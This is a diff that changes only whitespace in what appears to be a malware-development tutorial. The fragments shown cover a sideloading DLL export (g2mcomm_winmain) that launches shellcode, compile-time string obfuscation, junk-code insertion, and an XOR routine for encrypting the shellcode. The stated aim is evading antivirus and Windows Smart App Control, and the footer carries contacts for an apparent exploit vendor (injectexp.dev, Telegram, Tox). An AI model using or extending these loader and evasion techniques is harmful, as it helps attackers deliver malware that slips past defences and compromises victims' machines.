@@ -131,7 +131,7 @@ Let's import this file #include "name". We get the following final code as a res
 void execute();
 
 extern "C" __declspec(dllexport) __attribute__((visibility("default"))) int g2mcomm_winmain(DWORD, int, DWORD, DWORD, DWORD, DWORD){
- 
+
 return 0;
 }
 # define memcpy(D,S,N) {char*xxd=(char*)(D);const char*xxs=(const char*)(S);\
@@ -257,7 +257,7 @@ As we can see and can observe, our shellcode has successfully worked and launche
 
 ### In the next steps, we will add string obfuscation and code littering.
 
-To encrypt strings in Compile Time, we will use the repository [Obfuscate](https://github.com/adamyaxley/Obfuscate) 
+To encrypt strings in Compile Time, we will use the repository [Obfuscate](https://github.com/adamyaxley/Obfuscate)
 Copy the code from obfuscate.h or download it and throw it into our project, then #include "obfuscate.h"
 To obfuscate a string, it will be enough to write AY_OBFUSCATE and put our string there.
 
@@ -266,7 +266,7 @@ As we can see, just a cloud of garbage code was added to those places where it w
 For the cipher of the shellcode itself, you can make the simplest xor method, the Integer value will act as the key, as well as slightly confuse the code by adding rand(), the code will be universal for both decryption and encryption, in theory you can still screw compression, but we already have it in the bagel and it works fine.
 
 ```
-std::string EncryptDecrypt(const std::string& input, int key) { 
+std::string EncryptDecrypt(const std::string& input, int key) {
     std::string output = input;
     char a;
     key = rand() % 99;
@@ -668,8 +668,8 @@ The disadvantage of this method lies in the new Smart App Control that appeared 
 
 <img align="left" src="https://injectexp.dev/assets/img/logo/logo1.png">
 Contacts:
-injectexp.dev / 
-pro.injectexp.dev / 
+injectexp.dev /
+pro.injectexp.dev /
 Telegram: @Evi1Grey5 [support]
 Tox: 340EF1DCEEC5B395B9B45963F945C00238ADDEAC87C117F64F46206911474C61981D96420B72
 
